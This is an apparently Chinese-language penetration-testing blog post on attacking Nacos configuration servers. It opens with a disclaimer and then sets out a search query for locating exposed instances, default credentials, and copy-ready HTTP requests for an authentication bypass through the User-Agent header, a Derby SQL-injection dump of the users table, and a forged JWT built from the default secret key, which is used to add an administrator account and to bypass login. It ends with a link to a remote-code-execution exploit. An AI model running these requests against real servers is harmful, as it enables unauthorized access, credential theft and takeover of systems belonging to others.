# 原创
：  渗透测试--Nacos系统

# 渗透测试--Nacos系统

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行负责**

### 一：前言

nacos是指**Name and Config Service**，阿里为 SpringCloud 贡献了一个子项目，叫做 SpringCloud Alibaba，其中包括了微服务开发中的几个基础组件，Nacos 就是此项目中的一项技术。可以实现服务注册中心、分布式配置中心。针对微服务架构中的服务发现、配置管理、服务治理的综合型解决方案。Nacos在攻防实战中也是经常遇到，大多数布置是在内网，但是公网上也是有不少的，因为其存在多个漏洞，师傅们也是通过nacos拿下了不少分数。

### 二：空间测绘查询

fofa:<br/> `protocol="nacos(http)"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/b7e08d9310fb4090ed0f1326bcb03197.jpeg"/><br/> 可以看到公网上还真不少<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/c7dab720c04a466b43911aaa0d6a6528.jpeg"/><br/> 没接触过的师傅们发现搜出来会是上图这样的，WEB页面呢？nacos的web页面是要加上正确的路径才能访问的。一般是加上/nacos/路径就可以访问，即http://x.x.x.x/nacos/<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/9327e6d3d46c26df043d34e8e0191101.jpeg"/><br/> 当然也有为了安全考虑更换了默认路径的。这就要靠师傅们思路去寻找了。

### 三：Nacos默认密码

nacos系统默认账号密码为nacos/nacos，运气好的话还是可以遇到的。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/0cb5a728367e7050ae51ac4890e9343b.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/8dc93a62ebaba6d5c0134ffe137ab861.jpeg"/>

### 四：Nacos未授权访问CVE-2021-29441

此漏洞原因是nacos在认证时会判断User-agent是否为”Nacos-Server”，如果是的话会不进行任何认证。<br/> POC：

```
GET /nacos/v1/auth/users?pageNo=1&amp;pageSize=99 HTTP/1.1
User-Agent: Nacos-Server
Host: x.x.x.x
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/cff32ae637e8e2920f7d9d7eebcf0cfe.jpeg"/><br/> 可以得到所有用户以及加密后的密码。

### 五：SQL注入(CNVD-2020-67618）

nacos在derby端点存在SQL注入<br/> select * from users<br/> POC:

```
GET /nacos/v1/cs/ops/derby?sql=%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72%73 HTTP/1.1
User-Agent: Nacos-Server
Host: x.x.x.x
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close

```

### 六: Nacos权限绕过（QVD-2023-6271）

这个漏洞个人认为是最常见的一个，有一半以上的nacos系统都存在这个洞。而且利用简单，危害极大。漏洞产生原因是nacos系统采用了默认的JWT密钥，nacos的JWT默认key是SecretKey012345678901234567890123456789012345678901234567890123456789<br/> 我们使用默认key构造新的JWT，推荐https://jwt.io/网站<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/0ff98c4877c2dd525a2b2e099dfab42c.jpeg"/>

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0.00LxfkpzYpdVeojTfqMhtpPvNidpNcDoLU90MnHzA8Q

```

即为默认nacos用户的一个JWT，有了JWT，那么一切身份认证都是虚无。在日常攻防中常用的就是添加用户、修改密码、登录绕过。<br/> 添加一个账号密码为test的用户

```
POST /nacos/v1/auth/users HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0.00LxfkpzYpdVeojTfqMhtpPvNidpNcDoLU90MnHzA8Q
Content-type: application/x-www-form-urlencoded
User-Agent: Nacos-Server
Host: .x.x.x.x
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Length: 27
Connection: close

username=test&amp;password=test

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/2f9ead8577bd7e88822d1af0e446bbf7.jpeg"/><br/> 或者直接用accessToken绕过登录

```
POST /nacos/v1/auth/users/login HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6OTk5OTk5OTk5OX0.00LxfkpzYpdVeojTfqMhtpPvNidpNcDoLU90MnHzA8Q
User-Agent: Nacos-Server
Host: x.x.x.x
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-type: application/x-www-form-urlencoded
Content-Length: 29
Connection: close

username=nacos&amp;password=nacos

```

<img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/5cf2e0899965b4ce69639cb03c01e51e.jpeg"/><br/> 复制响应体，然后用任意账号密码登录，拦截返回包，然后替换返回包。<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/9de5b727bdee703f8caee993472c8677.jpeg"/><br/> 发包，就可以成功登录<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/cd44a739f0d579903d51246138a84608.jpeg"/>

### 七：Nacos 集群 Raft 反序列化漏洞 （CNVD-2023-45001）

源于 Nacos 集群处理部分 Jraft 请求时，未限制使用 hessian 进行反 。序列化，攻击者可以通过发送特制的请求触发该漏洞，最终执行任意远程代码。nacos2.*版本默认开启了危险端口7848，1.*没有，所以该漏洞主要使用于nacos2.*版本<br/> 这个洞至今还没有打成功过，放一个大佬的exp大家可以试试<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/378a3288b22c98c29c2055b4829063f1.jpeg"/><br/> https://github.com/c0olw/NacosRce/
